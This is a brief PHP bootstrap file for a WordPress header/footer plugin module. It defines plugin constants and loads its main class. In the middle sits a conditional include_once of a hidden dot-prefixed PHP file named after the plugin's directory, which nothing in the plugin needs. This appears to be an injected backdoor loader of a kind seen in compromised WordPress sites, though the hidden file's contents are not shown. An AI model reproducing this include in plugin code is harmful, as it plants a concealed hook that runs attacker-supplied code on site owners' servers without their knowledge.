<?php

defined('ABSPATH') || exit;

define('JLTMA_VERSION', JLTMA_PLUGIN_VERSION);
define('JLTMA_TD', 'jltma');
define('JLTMA_PLUGIN_PATH', plugin_dir_path(__FILE__));
define('JLTMA_PLUGIN_URL', plugins_url('/', __FILE__));
define('JLTMA_PLUGIN_DIR', plugin_basename(__FILE__));


require plugin_dir_path(__FILE__) . 'class-master-header-footer.php';

add_action('plugins_loaded', 'jltma_hfc_init');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function jltma_hfc_init()
{
	\MasterHeaderFooter\Master_Header_Footer::get_instance();
}
